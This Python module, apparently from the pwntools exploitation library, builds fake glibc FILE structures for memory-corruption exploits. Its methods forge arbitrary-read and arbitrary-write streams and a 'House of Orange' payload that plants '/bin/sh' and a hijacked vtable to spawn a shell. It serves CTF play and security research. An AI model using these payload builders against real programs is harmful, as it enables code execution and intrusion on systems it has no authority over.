# -*- coding: utf-8 -*-
r"""
File Structure Exploitation

struct FILE (_IO_FILE) is the structure of File Streams. This offers various targets for exploitation on an existing bug in the code. Examples - _IO_buf_base and _IO_buf_end for reading data to arbitrary location.

Remembering the offsets of various structure members while faking a FILE structure can be difficult, so this python class helps you with that. Example-

>>> context.clear(arch='amd64')
>>> fileStr = FileStructure(null=0xdeadbeef)
>>> fileStr.vtable = 0xcafebabe
>>> payload = str(fileStr)

Now payload contains the FILE structure with its vtable pointer pointing to 0xcafebabe
"""

from __future__ import absolute_import
from __future__ import division

from pwnlib.context import context
from pwn import *

length = 0
size = 'size'
name = 'name'

variables = {
    0: {
        name: '_flags',
        size: length
    },
    1: {
        name: '_IO_read_ptr',
        size: length
    },
    2: {
        name: '_IO_read_end',
        size: length
    },
    3: {
        name: '_IO_read_base',
        size: length
    },
    4: {
        name: '_IO_write_base',
        size: length
    },
    5: {
        name: '_IO_write_ptr',
        size: length
    },
    6: {
        name: '_IO_write_end',
        size: length
    },
    7: {
        name: '_IO_buf_base',
        size: length
    },
    8: {
        name: '_IO_buf_end',
        size: length
    },
    9: {
        name: '_IO_save_base',
        size: length
    },
    10: {
        name: '_IO_backup_base',
        size: length
    },
    11: {
        name: '_IO_save_end',
        size: length
    },
    12: {
        name: '_markers',
        size: length
    },
    13: {
        name: '_chain',
        size: length
    },
    14: {
        name: '_fileno',
        size: 4
    },
    15: {
        name: '_flags2',
        size: 4
    },
    16: {
        name: '_old_offset',
        size: length
    },
    17: {
        name: '_cur_column',
        size: 2
    },
    18: {
        name: '_vtable_offset',
        size: 1
    },
    19: {
        name: '_shortbuf',
        size: 1
    },
    20: {
        name: 'unknown1',
        size: -4
    },
    21: {
        name: '_lock',
        size: length
    },
    22: {
        name: '_offset',
        size: 8
    },
    23: {
        name: '_codecvt',
        size: length
    },
    24: {
        name: '_wide_data',
        size: length
    },
    25: {
        name: '_freeres_list',
        size: length
    },
    26: {
        name: '_freeres_buf',
        size: length
    },
    27: {
        name: '__pad5',
        size: length
    },
    28: {
        name: '_mode',
        size: 4
    },
    29: {
        name: '_unused2',
        size: length
    },
    30: {
        name: 'vtable',
        size: length
    }
}

defaults = ['_chain', '_lock', '_wide_data']


def get_defaults(null):
    var = {}
    for i in defaults:
        var[i] = null
    return var


def update_var(l):
    var = {}
    for i in variables:
        var[variables[i]['name']] = variables[i]['size']
    for i in var:
        if var[i] <= 0:
            var[i] += l
    if l == 4:
        var['_unused2'] = 40
    else:
        var['_unused2'] = 20
    return var


def packit(s, l=8):
    if l == 0:
        return ''
    return hex(s)[2:].rjust(2 * l, '0').replace('L',
                                                '').decode('hex')[::-1].ljust(
                                                    l, '\x00'
                                                )


class FileStructure(dict):
    r"""
    Crafts a FILE structure, with default values for some fields, like _lock which should point to null ideally, set.

    Arguments:
        null(int)
            A pointer to NULL value in memory. This pointer can lie in any segment (stack, heap, bss, libc etc)

    Examples:

        FILE structure with _flags as 0xfbad1807 and _IO_buf_base and _IO_buf_end pointing to 0xcafebabe and 0xfacef00d

        >>> context.clear(arch='amd64')
        >>> fileStr = FileStructure(null=0xdeadbeeef)
        >>> fileStr._flags = 0xfbad1807
        >>> fileStr._IO_buf_base = 0xcafebabe
        >>> fileStr._IO_buf_end = 0xfacef00d
        >>> payload = str(fileStr)

        check the length of the FileStructure

        >>> len(fileStr)
        224

        payload for stuff till 'v' where 'v' is a structure. This payload includes 'v' as well. Example payload for data uptil _IO_buf_end

        >>> payload = fileStr.struntil("_IO_buf_end")

        Reading data into arbitrary memory location. Example for reading 100 bytes from stdin into the address 0xcafebabe

        >>> context.clear(arch='amd64')
        >>> fileStr = FileStructure(0xdeadbeef)
        >>> payload = fileStr.read(addr=0xcafebabe, size=100)

        Writing data out from arbitrary memory address. Example for writing 100 bytes to stdout from the address 0xcafebabe

        >>> context.clear(arch='amd64')
        >>> fileStr = FileStructure(0xdeadbeef)
        >>> payload = fileStr.write(addr=0xcafebabe, size=100)

        Perform a House of Orange, provided you have libc leaks. For example if address of _IO_list_all is 0xfacef00d and fake vtable is at 0xcafebabe -

        >>> context.clear(arch='amd64')
        >>> fileStr = FileStructure(0xdeadbeef)
        >>> payload = fileStr.orange(io_list_all=0xfacef00d, vtable=0xcafebabe)
    """

    vars_ = []
    length = {}
    arch = 'amd64'

    def __init__(self, null=0):
        self.vars_ = [variables[i]['name'] for i in sorted(variables.keys())]
        self.update({v: 0 for v in self.vars_})
        self.update(get_defaults(null))
        self['_offset'] = 0xffffffffffffffff
        self.arch = context.arch
        if self.arch == 'i386':
            self.length = update_var(4)
            self['_old_offset'] = 0xffffffff
        else:
            self.length = update_var(8)
            self['_old_offset'] = 0xffffffffffffffff

    def __setattr__(self, item, value):
        if item in FileStructure.__dict__:
            object.__setattr__(self, item, value)
        else:
            self.set_vars(item, value)

    def __getattr__(self, item):
        return self[item]

    def __setitem__(self, item, value):
        if item not in self.vars_:
            log.error("Unknown variable %r" % item)
        return super(FileStructure, self).__setitem__(item, value)

    '''
    This defination for __repr__ to order the structure members. Useful when viewing a structure objet in python/IPython shell
    '''

    def __repr__(self):
        d = self.sort_str()
        return "{" + "\n".join((" %r: %s" % (k, hex(v))) for k, v in d) + "}"

    def __len__(self):
        return len(str(self))

    def __str__(self):
        structure = ''
        for val in self.vars_:
            if type(self[val]) is str:
                if self.arch == 'i386':
                    structure += self[val].ljust(4, '\x00')
                else:
                    structure += self[val].ljust(8, '\x00')
            else:
                structure += packit(self[val], self.length[val])
        return structure

    def sort_str(self):
        d = self.items()
        d.sort(key=lambda x: self.vars_.index(x[0]))
        return d

    def set_vars(self, item, value):
        self[item] = value

    def struntil(self, v):
        if v not in self.vars_:
            return ''
        structure = ''
        for val in self.vars_:
            if type(self[val]) is str:
                if self.arch == 'i386':
                    structure += self[val].ljust(4, '\x00')
                else:
                    structure += self[val].ljust(8, '\x00')
            else:
                structure += packit(self[val], self.length[val])
            if val == v:
                break
        return structure[:len(structure) - 1]

    def write(self, addr=0, size=0):
        self['_flags'] &= ~8
        self['_flags'] |= 0x800
        self['_IO_write_base'] = addr
        self['_IO_write_ptr'] = addr + size
        self['_IO_read_end'] = addr
        self['_fileno'] = 1
        return self.struntil('_fileno')

    def read(self, addr=0, size=0):
        self['_flags'] &= ~4
        self['_IO_read_base'] = 0
        self['_IO_read_ptr'] = 0
        self['_IO_buf_base'] = addr
        self['_IO_buf_end'] = addr + size
        self['_fileno'] = 0
        return self.struntil('_fileno')

    def orange(self, io_list_all, vtable):
        if self.arch == 'amd64':
            self['_flags'] = '/bin/sh\x00'
            self['_IO_read_ptr'] = 0x61
            self['_IO_read_base'] = io_list_all - 0x10
        else:
            self['_flags'] = 'sh\x00'
            self['_IO_read_ptr'] = 0x121
            self['_IO_read_base'] = io_list_all - 0x8
        self['_IO_write_base'] = 0
        self['_IO_write_ptr'] = 1
        self['vtable'] = vtable
        return self.__str__()


if __name__ == '__main__':
    from doctest import testmod
    from IPython import embed
    context.arch = 'amd64'
    q = FileStructure(null=0xdeadbeef)
    testmod()
    embed()
